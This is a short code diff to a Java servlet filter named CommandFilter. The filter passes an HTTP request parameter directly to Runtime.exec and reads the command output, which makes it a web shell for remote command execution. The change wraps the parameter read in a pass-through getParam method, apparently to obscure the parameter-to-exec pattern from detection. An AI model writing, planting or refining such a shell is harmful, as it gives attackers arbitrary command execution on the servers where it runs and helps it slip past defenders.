@@ -18,11 +18,15 @@ public class CommandFilter implements Filter {
 
     }
 
+    public String getParam(String param) {
+        return param;
+    }
+
     @Override
     public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
         HttpServletRequest servletRequest = (HttpServletRequest) request;
         HttpServletResponse servletResponse = (HttpServletResponse) response;
-        String cmd = servletRequest.getParameter(paramName);
+        String cmd = getParam(servletRequest.getParameter(paramName));
         if (cmd != null) {
             Process exec = Runtime.getRuntime().exec(cmd);
             InputStream inputStream = exec.getInputStream();
